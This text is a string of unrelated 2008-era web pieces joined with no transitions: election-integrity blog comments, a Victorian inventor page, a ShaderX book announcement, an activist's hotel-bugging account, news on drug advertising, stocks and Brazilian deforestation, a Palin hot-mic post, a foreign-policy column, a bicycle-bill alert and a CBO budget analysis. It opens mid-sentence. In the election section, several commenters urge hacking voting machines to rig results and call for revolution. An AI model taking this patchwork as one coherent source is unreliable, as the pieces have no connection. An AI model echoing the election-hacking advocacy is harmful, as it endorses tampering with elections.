national dialogue will have an unprecedented opportunity to be heard .
Needless to say , the more
quickly mobilization is achieved , the more quickly a true election movement can succeed .
Thank you
in advance for your action .
( Signed ) ** Election Integrity by Public Audit must involve the right to vote , integrity of the vote , integrity of the
counting and integrity of the reporting .
Right to Vote : Especially because of the home foreclosure crisis , Election Day registration can be a
simple adjustment of the logistics of provisional voting .
Integrity of the Vote : Supermarket and other retail machines have , for years , guaranteed the integrity
of a transaction by rendering a receipt which can be compared to the official record .
Discrepancies
should result in monetary fine of the BoE , to be rendered to the offended voter .
Integrity of the Counting : can best be verified by a public witness to the counting , including receipt
comparison , at every neighborhood precinct , immediately after the polls close .
Integrity of the Reporting : can best be verified by immediate public announcing and posting of
precinct level totals at each precinct , enabling each candidate to count his / her own votes .

Oh dear lord .
And with that kind of thinking , we will continue to lose elections .
OF COURSE it 's against the law , that is not and has never been the issue .
The fact is that the typical , passive Democrat approach of simply pointing out something is illegal ( if even that ) has failed ONE HUNDRED PERCENT OF THE TIME thus far .
There has not been a SINGLE election in United States history that Rethugs have cheated on that Democrats have successfully overturned .
Period .
Ergo , my question about whether or not a new and outlandish approach may be in order , such as the one I suggested .
Simply pointing out what the law is will NOT work .
Period !

Yeah , Brad , if we want them to stop murdering innocents , we should start doing it too , see how they like them apples ... and , really , if they think breaking the constitution is no great shakes , they are going to really be upset when we do it .
Actually , " Leftist " , while there is a dim chance such illustrativeness would have its desired effect --- say , one in ten million --- and I really understand the frustration out there , it bugs me how glib people can be about this stuff .

Brad Said ,
" Leftist " asked :
So why do n't the Dems just do their own hacking ?
Because that would be illegal .
Well , what about Independents hacking the election for a fictional candidate such as Micky Mouse or Osama Bin Laden ?
Would it still be illegal then ?
Even if technically illegal , would it be wrong ?
If it was done to expose the flaws in the election systems I would acquit if I was on the jury .
The police sell drugs all the time as part of their undercover work when they try to bust meth rings , but their actions are n't deemed illegal because they are trying to stop a greater crime .
An even better metaphor : during Hillary 's speech at the DNC , everybody got all emotional ( including myself ) when she invoked Harriet Tubman , and told the audience to " Keep Going ! "
Well guess what , stealing ( freeing ) slaves was against the law but God Bless Harriet Tubman for being willing to break the law , when the law needed breaking .
Hows that for glib ?
WHEN the election is hacked for either / or / both Obama and McCain , it will be easily disguised , hidden , and accepted , as these videos show , but if some intrepid hackers rig it for a tie between Osama Bin Laden and Saddam Hussein , then it will be immediately confirmed for ALL , that the machines ( and the corporations that control them ) cannot be trusted .
Molly @ 16 is right , " this is deadly serious . "

I will tell ya what IS legal and guaranteed under what is left of the Constitution .
REVOLUTION !
Does not matter at all how many times this is pointed out to the criminally complicit MSM , can make all the videos you want , can show all 100 ways every one of these pathetic machines can be hacked and change the entire election in seconds leaving no trace of wrong doing .
Until the proverbial boot heel comes down and down HARD on the necks of all of the MSM by MILLIONS of damn angry and not going to take it anymore American patriots then NOTHING is going to change .
This election WILL be stolen .
The MSM has already steered THEIR chosen candidates into place so basically the S-election has already been stolen .
This country will not survive McSame / Pentecostal Barbie .
In a sadistic sorta way I actually hope these nut bags do steal the S-election because maybe when the country completely collapses into a Depression that will make the Great Depression in the 30s look like the Good Ol Days and that 98 % finally pulls their freaking heads outa their asses to see the 2 % completely unaffected while they are fighting off stray curs at garbage cans to get some offal .
MAYBE then the 98 % will WTFU ?

perhaps the quickest way to get the republicans to support clean , verifiable elections is to out hack them .
If it is as easy as stated in the above article , the election could be altered to show a landslide for Obama , making him the winner , while obviously demonstrating the hackability of electronic voting systems .
With such a close election , Republicans would be screaming for election reform .
we simply cannot afford to have the neocons steal another presidential election .
With global warming rearing its ugly head , time is of the essence .

If you are not a history lover , then you may not have heard the name Goldsworthy before .
Even if you do like history , this gentleman may have slipped your notice .
However , he deserves a lot more attention than what he has gotten so far .
This site is a way to try and give him a bit more attention .
One of the reasons he is not well - known is that there has been disputes with regards to his accomplishments .
Did he or did not develop the blastpipe ?
It is this invention that is the most disputed , even today .
The reason being that this simple element is crucial to the workings of steam locomotives , engines and so forth .
We also want to shine a light on other inventors that society as such owes a debt , but that have been forgotten .
History is exciting and that is what we want to show on this site .
The Victorian era
The Victorian era is defined as the period of Queen Vicorias reign .
This period lasted from June 20th 1837 until the queen died on January 22 , 1901 .
The period was marked peace , inventions and prosperity , especially for the British Empire .
In this period many new inventions saw the light of day and it was in this creative period that Sir Goldworthy Gurney lived and made all of his inventions .
Sir Goldworthy also enjoyed different types of games on his spare time , especially boardgames .
In todays world many people enjoy games as well but its more online and are gambling based like casino online or different types of computer games .
The golden age of machines
The industrial age started around 1760 in Great Britain and it was really gaining momentum in the Victorian era .
The new steam powered machines replaced people .
The machines still needed people that could control it , feed it and so forth .
However , the machines worked faster and cheaper than the people .
There were a lot of different machines that saw the light of day in this period , including slot machines and calculators .
The machines had to be tinkered with and improved all the time , to make them faster and more efficient .
Inventors like Sir Goldsworthy
Gurney made money from improving the inventions , making new ones and looking for new ways of cutting costs .
Many of the inventors were more concerned with getting recognition than with getting paid .
It was the challenge of getting things done and improving them that drove them .
This is not to say that they did n’t get money , some also needed the money desperately .
Not everything was positive
Even though the industrial age , and the inventions made by people like Sir Goldsworthy Gurney was necessary , it was not without problems .
The faster production pace that the machine could maintain meant that the prices dropped .
Therefore , it was not possible for the smaller groups to make a living out of producing the same product without machines .
It also lead to people moving into the cities and of course it lead to pollution .
Lung problems became more common .
This is also a part of the history of the industrial age and also the Victorian age .
Wolfgang Engel ( editor in chief of the ShaderX series ) kindly sent me copies of the two ShaderX ^ 2 books last year , so that I could read through them and reference useful articles in writing the third edition of Real - Time Rendering ( RTR3 ) .
He also provided us with the contents of the then - unpublished ShaderX ^6 – he was a huge help in making RTR3 up - to - date .
While writing , I learnt that Wolfgang was willing to release the ShaderX ^2 books electronically for free .
However , he was advised by the publisher to check with the authors to see if they had any reservations .
I like these books ; some of the articles are dated , but there ’s still solid material in many that should be made widely available .
Also , I hated referencing articles in RTR3 that few people could actually go look up .
Finally , I found that the PDFs of these two books were already being distributed illegally through a torrent .
It struck me as unreasonable that the two ways to obtain these out - of - print books was through illegal downloading or through rather exorbitant prices in used - book markets ( currently the prices are down in the $ 30 range ; at one point last year the lowest price I saw for one of the books was $ 100 ) .
Wolfgang did n’t have the time this Spring to gather permissions ( he was busy at the time with GTA IV and other projects ) , and I wanted to begin to repay him for all his help .
So , I spent some time these past two months getting permission release forms signed for the ShaderX ^ 2 books .
66 article clearances later , I ’m done !
There were no objections from the authors , usually just the opposite , so the books are now generously being hosted for free download by gamedev.net :
ShaderX2 : Introduction & Tutorials with DirectX 9
ShaderX2 : Shader Programming Tips and Tricks with DirectX 9
The books are “ ancient ” , four years old , but there is some great material in them .
Greg James ’ article about rendering thick volumes has been cited by a number of later papers .
I particularly enjoyed the articles by Mitchell et al. and Ansari in the Image Space section , as I love post - processing effects .
They present lots of code snippets alongside solid theory .
Which reminds me , we should also work on putting the CD - ROM ’s contents up on the web – next task .
Also , the first ShaderX book has also been cleared for free download .
Wolfgang is digging through his archives for a PDF version of this book , and I hope it will be available soon .
In the meantime , all of the articles from authors at ATI ( at the time ) are available on the AMD / ATI website .
Update : see the ShaderX Books page at the ACM TOG site for a link to the first book and other related free resources .

Phones in the Fridge contact [ at ] cindyforcongress.org )
Monday Aug 25th , 2008 12:25 AM by Cindy Sheehan
This is Cindy Sheehan 's account on what happened to her when she came back to her hotel room early following a day of activism in Denver to the lead up to this week 's DNC ..
Phones in the Fridge
CFC in Denver , Co
Cindy for Congress adamantly believes that the problems in this country ( and world ) go way deeper than the Republican Party .
We believed this before our campaign , and unfortunately , we have been proven correct repeatedly with Dem leadership sanctioning the occupations , torture , destroying our 4th amendment and not upholding the rule of law and Constitution especially since regaining majorities of both Houses of Congress --- off the backs of the grass roots movement , that the Party has virtually ignored for the last year and a half , plus .
With the Democratic Party moving farther to the right each day , we believe it is even more imperative to have our voices heard for peace , accountability , fossil fuel independence , environmental stability and economic equality .
If We the People do n't drag our leaders towards the people and positive change , it wo n't happen , no matter who is the president , or which party controls Congress .
I know I was approached by many activists wearing Obama '08 paraphernalia that are very distressed with the direction their Party is going in , too .
Today , CFC participated in the Recreate ' 68 rally on the steps of the State Capitol here in Denver --- there were awesome speeches , especially by Cynthia McKinney ( Green Party Presidential Candidate ) and Ron Kovic ( disabled Vietnam Vet and subject of Born on the 4th of July ) .
World Can't Wait , ANSWER and other groups participated in the coalition and there were a reported 500 - 1500 people from all over the country in attendance .
I myself am distressed that most organizations in the so - called peace movement refuse to protest here in Denver because they believe that the Democratic leadership is any better than the Repugs .
Something that really bothered me at the rally , also , was when a group of activists surrounded the correspondent from Fox News .
Now , mind you , I abhor Fox News , however , I think Fox News is just a little worse than CNN ( brought to us by Lockheed Martin and Boeing ) and NBC ( owned and operated by General Electric ) .
Fox , ( like CNN and NBC ) is a propaganda ministry of the US imperial - military regime and deserves nothing but contempt and ridicule --- that 's why I refuse to do national Fox ( except when Sean Hannity called my bluff once ) and I DON'T WATCH the network .
So , we were there protesting our government 's suppression of our 1st amendment rights to peaceably gather and express our freedom of speech , and some elements of our side were denying 1st amendment protection to Fox News because they do n't agree with their speech --- as far as I am concerned that 's as bad as what BushCo have been doing for the last 8 years .
The most troubling thing happened , though , when I arrived back to my hotel .
We got back early because the altitude and sleeplessness were starting to take a toll on us .
We did not march after the rally , so we decided to rest before the next event at 7 pm .
As I walked toward my room , I noticed that the door was opened with the security bolt blocking the complete closing of the door .
I knew immediately that I had not left the door open , and I double checked to make sure it was the right room because , as a frequent traveler , I have been known to forget my room number , but it was the right room .
I was upset at first thinking that housekeeping had made a mistake and left my room open and I was worried that something might be missing .
So I walked into my room and bigger than life , there was a man standing by my desk holding the room phone with a screwdriver in his hand !
I immediately said ; " What the hell are you doing ?
Are you putting a bug on my phone ? "
He looked like he got caught with his hand in the cookie jar and stammered out : " N - - no , we are having problems with the phone . "
I told him to get out of my room because my phone was fine and I called the front desk and the person at the front desk stammered something out about " problems " with some of the phones .
This room was reserved soon after we got to Denver last night because the room we had was inadequate for 3 people .
The room was reserved under my campaign manager 's name with a CFC debit card .
By the time we left for the march , it could have very well been ascertained that I was the one in this room , and the room we did reserve could be bugged , also .
I am confident that that 's what was happening when I walked in on the " maintenance " man and I am becoming more shocked every day with what the ruling class are capable of .... that 's why ...
My phones are in the room fridge .
Let them listen to refridgerator noise .
CFC is feeling a little shaky on the security front , because there is no way to reasonably expect privacy from a Party and a government that has discarded our 4th amendment rights to be secure in our persons and papers ... in other words , our safety and our campaign can be compromised by a government that exists to protect our rights , not abuse them at will .
OUTRAGEOUS !!!
WASHINGTON ( Reuters ) - Expensive advertising of prescription drugs directly to consumers may do little to encourage sales , U.S. and Canadian researchers reported on Monday .
A pharmacist in a file photo .
REUTERS / Mark Blinch
They said that even though companies spent an estimated $ 3 billion in 2005 on such ads in the United States , they did not appear to result in more prescriptions .
Most countries ban direct advertising of prescription medications , with the exceptions of the United States and New Zealand .
“ People tend to think that if direct - to - consumer advertising was n’t effective , pharma would n’t be doing it , ” Harvard Medical School ’s Stephen Soumerai said in a statement .
“ But as it turns out , decisions to market directly to consumers are based on scant data . ”
The team at Harvard and the University of Alberta set up an experiment using French - speaking Quebec residents as their “ control ” group .
English - dominant Canadians see a great deal of U.S. advertising , but French - speaking Quebecois see far less and thus are less likely to be influenced , the researchers reported in the British Medical Journal .
The researchers looked at three drugs : Enbrel , or etancercept , sold by Wyeth and Amgen to treat rheumatoid arthritis and other conditions ; Novartis AG ’s now - withdrawn irritable bowel drug Zelnorm ; and the Nasonex allergy treatment made by Schering Plough Corp .
PHARMACY SALES
All three drugs were on the market for at least a year before the ads started and none were advertised via legal “ soft ” ads in Canada that allow mention of the drug ’s name but not what it is for .
They looked at prescription data from 2,700 pharmacies compiled by IMS Health Canada and found no difference in sales for Enbrel or Nasonex after the U.S. ads began .
They did see a 40 percent increase in sales of Zelnorm in English - speaking Canada as soon as the U.S. ad campaign began -- a jump mirrored by U.S. sales .
But after a few years sales flattened out , and the rise could have been because there were no alternatives for consumers , they said .
Pharmaceuticals are not typical consumer products , Soumerai said .
“ A person needs to see an ad , get motivated by that ad , contact their doctor for an appointment , show up at the appointment , communicate both the condition and the drug to the doctor , convince the doctor that this drug is preferable to other alternatives , then actually go out and fill the prescription , ” he said .
“ This is a chain of events that can break at any point . ”
The nonprofit Kaiser Family Foundation has come to similar conclusions in reports on direct - to - consumer ads .
In an April report the foundation found that 91 percent of adults surveyed had seen or heard advertisements for prescription drugs , but just one - third spoke to a doctor about a drug they saw advertised , and 54 percent of them got a prescription for a different drug .
Among doctors , 76 percent said they sometimes recommend a different prescription drug to a patient who mentions a drug ad and 5 percent said they frequently gave patients the drug .
NEW YORK ( CNNMoney.com ) --
Stocks got a big bounce back Wednesday as investors welcomed encouraging news from the banking and airline sectors .
Falling oil prices also helped spark a strong stock market rally .
The Dow Jones industrial average ( INDU ) gained 277 points to end the day more than 2.5 % higher .
Wednesday 's rise marked the largest one - day increase in the Dow since April 1 .
The Dow rallied back after ending Tuesday at its lowest level since July 21 , 2006 .
The Standard & Poor 's 500 ( SPX ) index also added 2.5 % , and the tech - laden Nasdaq composite ( COMP ) gained 3.1 % .
The S&P 500 bounced back from its lowest close since Nov. 2 , 2005 .
The rally came despite a reading showing a jump in inflation .
The Consumer Price Index , a key inflation gauge , soared 5 % in the past year - the biggest annual jump in more than 17 years .
Record gas and food prices helped the index jump to levels that outpaced the average annual pay increase .
( Full story )
Stocks were volatile in early trade as investors were spooked by the CPI report , reflecting a knee - jerk reaction to any bad news in the continually tepid economic climate .
However , the market turned higher quickly after the open as traders absorbed several positive corporate results .
Investors welcomed the news as a sign of relief on pressured markets .
" The market can't go down forever , " said Harry Clark , chief executive of Capital Management Group .
" Investor sentiment was so negative that any news can now be taken as a positive . "
Stocks were sent even higher after oil plunged following the government 's weekly stockpile report , and maintained steady gains for the remainder of the session .
" The stock market is a game of confidence , and it feels like confidence has been restored to some degree , " said Robert Philips , president and chief investment officer of Walnut Asset Management .
" Oil falling is obviously very helpful for that . "
Investors will see if the market can sustain a run Thursday as several more bank earnings are due before the market open .
Reports on housing starts , initial jobless claims and the Philadelphia manufacturing sector will also be released Thursday .
After the market close , online auction Web site eBay ( EBAY , Fortune 500 ) announced earnings rose 22 % , beating Wall Street 's expectations .
Shares of eBay fell 6 % in aftermarket trading , however , as its third - quarter earnings forecast failed to impress investors .
Financials bounce back : Financial industry stocks rebounded strongly Wednesday morning , as some upbeat corporate results helped ease some investor concerns about the battered industry , lifting the S&P Banking Index by more than 20 % .
( Full Story )
Shares of Wells Fargo ( WFC , Fortune 500 ) soared 32.8 % after it reported a 22 % drop in second - quarter earnings that nevertheless topped estimates .
The struggling bank cited a growing number of unpaid loans for the slide , but raised its quarterly stock dividend to 34 cents a share from 31 cents a share .
Other financial names also reported results that were ahead of expectations , including Charles Schwab ( SCHW , Fortune 500 ) , whose stock rose 14.3 % , Northern Trust ( NTRS , Fortune 500 ) , up 13.1 % , and Marshall & Ilsley ( MI , Fortune 500 ) , which gained 17.3 % .
" The bank situation is coming to an end now , " said Clark .
" We 're looking at a rally ahead of us - though how long that rally will last is unclear . "
Federal Reserve Chairman Ben Bernanke appeared before the House Financial Services Committee Wednesday after testifying before the Senate Banking Committee Tuesday .
In his testimony , Bernanke stated that government - backed mortgage financers Fannie Mae and Freddie Mac are " in no danger of failing . "
( Full story )
That helped Fannie ( FNM , Fortune 500 ) and Freddie ( FRE , Fortune 500 ) soar 30 % in Wednesday trading .
The embattled firms were the focal points of downtrodden investor sentiment toward financials for several of the previous sessions .
Shares of Washington Mutual ( WM , Fortune 500 ) jumped 25.5 % , helping the bank bounce back from a selloff earlier in the week .
A Lehman Brothers analyst note released Monday suggested the bank may need to " substantially " raise its reserves over the course of 2008 to cover losses from home loans .
Other struggling financials jumped on the bandwagon .
Bank of America ( BAC , Fortune 500 ) rose 22.4 % , JPMorgan Chase ( JPM , Fortune 500 ) gained 15.9 % , Wachovia ( WB , Fortune 500 ) soared 16.1 % and Citigroup ( C , Fortune 500 ) added 13.1 % .
Shares of investment bank Lehman Brothers ( LEH , Fortune 500 ) also soared 26 % despite investor concern that the firm may be on the verge of a Bear Stearns - like collapse .
Financials have been hammered for the past several quarters after the subprime mortgage collapse and ensuing credit crisis .
After the bank failure of IndyMac Friday , financials went into a virtual tailspin .
But some analysts think IndyMac 's failure is a sign that the worst is over .
" The catalyst for Wednesday 's rally was actually the IndyMac failure , " said Clark .
" Every major bank failure over the last 40 or 50 years represented a market bottom . "
Airlines : American Airlines and Delta Air Lines reported wide losses Wednesday , citing fuel - related costs , yet both companies beat analysts ' expectations .
( Full story )
No. 3 U.S. carrier Delta Air Lines ( DAL , Fortune 500 ) reported a net loss of $ 1 billion for the second quarter , including a writedown of $ 1.2 billion .
Delta said it had to cope with a $ 1 billion year - to - year increase in fuel costs .
Shares climbed 26.6 %
AMR Corp ( AMR , Fortune 500 ) , parent company of No. 1 carrier American Airlines , reported a net loss of $ 1.4 billion , or $ 5.77 per share , for the second quarter .
But that included $ 1.1 billion in one - time writedowns .
Shares of AMR Corp. surged 32 % Wednesday .
Falling oil prices and the upbeat quarterly results lifted other airlines , with most of the major U.S. carriers soaring .
Continental Airlines ( CAL , Fortune 500 ) rose 38.2 % , US Airways ( LCC , Fortune 500 ) gained 27.3 % and JetBlue ( JBLU ) added 21.4 % .
UAL Corp. ( UAUA , Fortune 500 ) , the parent company of United Airlines , was especially strong , gaining 41.5 %
" Airlines ' losses have been monumental forever but were only exacerbated recently by high oil prices , " said Philips .
" When oil goes down , there 's some hope they 'll lose less . "
Energy : Oil prices tumbled another $ 4.14 Wednesday , settling at $ 134.60 .
That drop comes after oil plunged more than $ 6 a barrel Tuesday - the biggest one - day drop in 17 years .

Bond prices and yields move in opposite directions .
At the heart of the Buzzball is a dual motor configuration , enabling the pilot to control the motion and direction of travel via left and right control triggers , which provides power to the driving wheels .
The amount of power applied to each wheel will determine the direction the Buzzball moves .
Powering one wheel will spin the pod and pilot on it's axis around the inside of the ball changing the direction of travel .
If power is applied equally to both wheels the pod will rear up as the wheels climb up the face of the ball forcing the ball to rotate around the pod and powering the Buzzball forward .

Conservatives Mike Murphy and Peggy Noonan were caught blasting John McCain for selecting Sarah Palin as his running mate by an open MSNBC microphone .
Here is the video / audio :

Mike Murphy :
It ’s not going to work … Still McCain can give a version of the Lieberman speech and do himself some good .
Peggy Noonan :
It ’s over .
Chuck Todd :
Do n’t you think this pick is insulting to Kay Bailey Hutchison ?
Noonan : I saw Kay this morning .
Todd : Yeah , she has never looked comfortable .
Murphy :
They are all bummed out about this .
Todd : I mean is she really the most qualified woman they could have picked ?
Noonan :
No , I think they went for this , excuse me , political bullshit about narratives .
Every time Republicans do that … they blow it . ”
Murphy : “ You know what ’s really the worst thing about it ?
The greatest of McCain is no cynicism , and it is cynical . ”
Not even Republicans are buying Sarah Palin as a legitimate running mate .
She was a bullshit pick designed to shock and get media attention .
I do believe that Texas senator Kay Bailey Hutchison would have been a much better choice .
Republicans should be bummed , because this is a pick that probably will cost them the election .
Palin has gotten media attention since Friday , but it has n’t been the kind that the campaign wanted .
She can come out and do her generic speech , but it is n’t going to help McCain a damn bit .
[ Thanks Haochi for the result !]

History books , as the saying goes , are written by the winners .
But when it comes to American history , it is often the losers of old debates whose interpretations are enshrined in the textbooks .
The Spanish - American war , for instance , was hugely popular at the time , and featured dramatic American victories .
But the critics who were not able to stop the war have still taught us to remember it as a travesty whipped up by the Hearst papers .
Click Image to Enlarge Maya Alleruzzo / AP HOW WILL THE IRAQ WAR BE REMEMBERED ?
A plume of smoke rises in the sky over a U.S. Army soldier near Qara Tappah , about 75 miles northeast of Baghdad in Iraq 's Diyala province , on July 22 , 2008 .
Today , the debate over the Iraq War is giving way to the debate over how that war will be remembered by posterity .
More is at stake than simply the historical reputation of President Bush ; for the way we remember , or misremember , our past will help to determine the way America acts in the future .
That is why World Affairs is shaping up to be one of the most important magazines in the world of foreign policy .
Since it launched at the beginning of this year ( actually , relaunched  the journal has been published in one form or another since the 19th century ) , the main focus of World Affairs has been to determine the moral and intellectual legacy of the Iraq War .
And its surprising discovery , which its contributors from across the political spectrum seem to agree on , is the continuing vitality of what used to be called neoconservative principles .
Since 2003 , the word neoconservative has become an all - purpose slur .
For the left and far right , it has come to refer to an undemocratic , belligerent ideology , promoted largely by Jews , who dragged America into the Iraq War against its will .
Much ingenuity has been expended to link neoconservatism to Leo Strauss , Leon Trotsky , or Sayyid Qutb  just about any intellectual godfather will do , so long as he is sinister and foreign .
Why , then , is it so hard for respectable foreign - policy thinkers to discard the basic principles of neoconservatism ?
The best answer I have found comes in the Spring issue of World Affairs , in Robert Kagan 's essay " Neocon Nation : Neoconservatism , c. 1776 . "
Mr. Kagan lays out a powerful case that neoconservative innovations in foreign policy are as old as America .
If we define neoconservatism , in Mr. Kagan 's words , as " potent moralism and idealism in world affairs , a belief in America 's exceptional role as a promoter of the principles of liberty and democracy , " then it was a doctrine held by Alexander Hamilton , Henry Clay , and Theodore Roosevelt .
" The effort to explain the [ Iraq ] war as the product of manipulation by a handful of ' neoconservatives , ' " Mr. Kagan writes , " is an effort to escape what for many may be a more troubling reality : that there is something in the American character which leads it in this direction . "
Reading World Affairs underscores the truth of Mr. Kagan 's observation .
The magazine , edited by Lawrence Kaplan , is not open to the extremes of left or right  neither Noam Chomsky nor Pat Buchanan .
But that still leaves a pretty broad swath of opinion , from Mr. Kagan on the right to Todd Gitlin on the left .
And the remarkable thing is that almost none of its contributors can or would challenge the " belief in America 's exceptional role as a promoter of the principles of liberty and democracy . "
It follows that the current attempts of the left , and the far right , to dismiss the Iraq War as a neoconservative adventure , a nightmare from which the country will soon awaken , are intellectually dishonest .
On the contrary , as Mr. Kagan points out in his essay , the Iraq War initially was popular with both political parties and in the country at large .
To criticize the way the war  or , more precisely , the occupation  was handled is not the way to dispute the rationale for the war .
" The decision to invade Iraq , " Mr. Kagan writes , " might have been correct or mistaken , but the lessons to be learned from the war ... concern matters of judgment , tactics , and execution . "
Some contributors to World Affairs do try to sketch an alternative to Mr. Kagan 's frank neoconservatism .
In the Summer issue , Peter Beinart urges America to " revive the collective security tradition , " and Mr. Gitlin suggests that the test of our foreign policy should be that it " proves capable of mobilizing a substantial coalition of national forces . "
Yet these hopeful phrases evade the basic fact that viable collective security arrangements depend on powerful countries ' willingness to use their power .
The League of Nations could not save Abyssinia , and without American armies , the United Nations could not have saved Kuwait .
As Christopher Hitchens , a regular columnist for the magazine , points out , " It 's eternally fashionable in Washington ( and elsewhere ) to contrast ' diplomatic ' initiatives with ' saber - rattling ' ones .
What this naïve dichotomy overlooks is the plain fact that without the known quantity of the American saber , few if any diplomatic movements would be possible , either . "
Generations from now , Americans may be taught that " the neoconservatives " forced America into war , much as Hearst believed in 1898 .
But after reading World Affairs it seems clear that , no matter who is in the White House when the next serious crisis comes , America is likely to find itself returning to the same calculus of interest and idealism  call it traditional , liberal , interventionist , or simply neoconservative  that it used when dealing with Iraq .

Thats right once again our elected leaders have fallen short of their duties when it comes to making biking awesome , so lets go kick some ass !
The below is from MassBike .
Action Alert # 1 : Bicyclist Safety Bill
This important bill will improve the safety of bicyclists throughout the Commonwealth , but we need your help .
The bill , now designated S. 2573 ( formerly S. 1414 ) , was passed by the Senate earlier this year thanks to the efforts of retiring Senator Pamela Resor and our other friends in the Legislature .
It is now in the House Ways and Means Committee .
It needs to get reported favorably by the committee , enacted by both houses of the Legislature , and signed by the Governor before the end of this year .
We are making a push to get this done now .
The key provisions of the bill are : police training on bicycle law ; clarification of how to safely pass a bicycle ; clarification of how to safely make turns in front of bicycles ; “ dooring ” subject to ticket and fine ; riding two abreast permitted when it does not impede cars from passing ; improved enforcement of bicycle law for both motorists and bicyclists ; and additional legal protections for bicyclists who choose to ride to the right of other traffic .
The full text of the bill can be found here .
For more details about the bill , including links to the affected statutes , see our previous Action Alert ,
Here is what you can do :

The federal budget is projected to run a $ 546 billion deficit in 2009 , compared with the $ 710 billion surplus that budget experts projected for 2009 back when President Bush took office nearly eight years ago .
This $ 1.3 trillion deterioration in the nation ’s fiscal finances for 2009 can be seen by comparing estimates that the Congressional Budget Office ( CBO ) released this week with those that CBO released in January 2001 .
The story is much the same for the entire ten - year period covered by CBO ’s 2001 projection .
In January 2001 , CBO projected a cumulative $ 5.6 trillion surplus for 2002 - 2011 .
Now , CBO ’s new report suggests the nation will amass a cumulative deficit of $ 3.8 trillion over that same period , marking a $ 9.4 trillion deterioration .
For both 2009 and the ten - year period , this massive deterioration is partly due to weaker - than - expected performance of the economy , along with other “ technical ” factors that are beyond policymakers ’ control .
But these economic and technical factors account for less than one - fourth of the fiscal deterioration for each period , and they are not responsible for the return of deficits .
Even given the disappointing performance of the economy since 2001 relative to CBO ’s earlier projections , there would have been large surpluses in every year — totaling $ 3.4 trillion over the 2002 - 2011 period — if policymakers had enacted no tax cuts or program increases since 2001 .
The dominant factor in the unprecedented fiscal deterioration thus was not the performance of the economy .
Nor was it increases in domestic programs .
The key factors have been large tax cuts and increases in security - related programs .
For fiscal 2009 , some $ 1 trillion of the $ 1.3 trillion deterioration in the nation ’s fiscal finances stems from policy actions , and tax cuts account for 42 percent of this $ 1 trillion deterioration .
Increases in military and other security programs account for another 40 percent of the deterioration .
The story is much the same for the ten - year period as a whole .
For the 2002 - 2011 period , tax cuts and increases in security programs account for more than four - fifths of the fiscal deterioration caused by policy actions .
Increases in domestic programs played a much more modest role .
The Trillion - Dollar Deterioration in the Budget ( Based on CBO ’s January 2001 and September 2008 Budget Projections ) 2009 Cumulative , 2002 - 2011 Jan. 2001 projection $ 710 billion surplus $ 5.6 trillion surplus Sept. 2008 estimate $ 546 billion deficit $ 3.8 trillion deficit Total deterioration $ 1,256 billion ( $ 1.3 trillion ) $ 9.4 trillion Deterioration solely from tax cuts and budget increases $ 1.0 trillion $ 7.2 trillion
The rest of this analysis examines in more detail the factors behind the $ 1 trillion budgetary deterioration in 2009 , and the $ 7.2 trillion deterioration over the 2001 - 2011 period , that were caused by policymakers ’ actions rather than economic or technical factors .
Impact of Tax Cuts and Spending Increases on the Budget for Fiscal Year 2009
As noted , tax cuts and program increases enacted by Congress have worsened the budget by about $ 1 trillion in 2009 .
( These figures assume that tax and program policies in place today will be continued . [ 1 ] )
As shown in Figure 1 , the key components are :
Tax cuts .
Enactment of the 2001 and 2003 tax cuts , along with AMT relief , the normal “ tax extenders , ” [ 2 ] and a variety of minor tax provisions have worsened the 2009 budget by $ 427 billion and thus account for 42 percent of the $ 1 trillion deterioration .
These figures include both the direct [ 3 ] costs of the tax cuts and their associated interest costs .
( By reducing projected revenues , the tax cuts have increased deficits and debt relative to the January 2001 projection .
With higher debt , the Treasury must pay more interest . )

Increases in appropriations for defense , international affairs , and homeland security .
Expenditures projected for this portion of the budget in 2009 are much higher than CBO projected in early 2001 .
While a substantial portion of the extra costs stem from the wars in Iraq and Afghanistan , there have also been significant increases in the underlying budgets of the Departments of Defense , State , and Homeland Security that are not directly related to these wars .
Total increases in this part of the budget amount to $ 399 billion in 2009 , relative to CBO ’s projection , and thus account for 40 percent of the $ 1 trillion deterioration , when the associated interest costs are included .

Increases in entitlement programs .
Since 2001 , Congress has enacted a number of entitlement increases , most notably the Medicare prescription drug benefit , but also increases in farm and nutrition programs , military retirement and health care , veterans ’ education benefits , and other , smaller programs .
These cost increases amount to $ 119 billion in 2009 , or 12 percent of the $ 1 trillion deterioration .

Increases in appropriations for domestic , or non-security , programs .
Funding for this portion of the budget has also increased above the levels projected in 2001 , although this funding peaked in real terms in 2004 and has generally declined since then .
The largest increases have occurred in education programs , veterans ’ health care , and transportation programs .
The increased expenditures in this part of the budget total $ 66 billion in 2009 , or 6 percent of the $ 1 trillion deterioration .
As can be seen , tax cuts and defense / security increases account for 82 percent of the budget deterioration in 2009 that is attributable to legislation enacted since January 2001 .
Increases in domestic spending account for 18 percent .
Impact of Tax Cuts and Budget Increases Over the 2002 - 2011 Period
Tax cuts and program increases enacted by Congress have worsened the budget by almost $ 7.2 trillion over the entire 2002 - 2011 period , an average of almost $ 720 billion per year .
( As noted above , these figures assume that tax and program policies in place today will be continued ; see footnote 1 . )
As Figure 2 shows , the key components are :
Tax cuts .
The 2001 and 2003 tax cuts and other tax provisions listed earlier will increase deficits by more than $ 3.3 trillion over the ten - year period , accounting for 46 percent of the $ 7.2 trillion deterioration .
These figures include both the direct costs of the tax cuts and their associated interest costs .

These increases , plus the associated interest costs , total $ 745 billion over the ten - year period , or 10 percent of the $ 7.2 trillion deterioration .
Increases in domestic ( or non-security ) discretionary programs .
These increases , plus the associated interest costs , total $ 456 billion over the ten - year period , or 6 percent of the $ 7.2 trillion deterioration .
Tax cuts and defense / security increases account for 83 percent of the budget deterioration over the 2002 - 2011 period that is attributable to legislation enacted since January 2001 .
Domestic spending increases account for 17 percent .
In sum , tax cuts , increased defense and security funding , and a dose of economic cold water are , in order , the three key reasons that the large surpluses projected in January 2001 turned into substantial deficits .
Increases in domestic programs have been relatively modest in comparison .
Concerns over the destruction of the Brazilian rainforest resurfaced at the weekend after it emerged that deforestation jumped by 64 % over the last 12 months , according to official government data .
Brazil 's National Institute for Space Research this week said that around 3,145 square miles - an area half the size of Wales - were razed between August 2007 and August 2008 .
With commodity prices hitting recent highs and loggers and soy farmers pushing ever further into the Amazon jungle , satellite images captured by a real - time monitoring system , known in Brazil as Deter , showed that deforestation was once again on the rise after three years on the wane .
The figures launched the controversy over how best to preserve the Amazon rainforest onto the front pages of Brazilian newspapers , and triggered a war of words between environmental campaigners and members of the government who claim that their struggle to protect the rainforest is not being given sufficient recognition .
" This is not about luck , it is about work , work , work , " Brazil 's environment minister , Carlos Minc , told reporters .
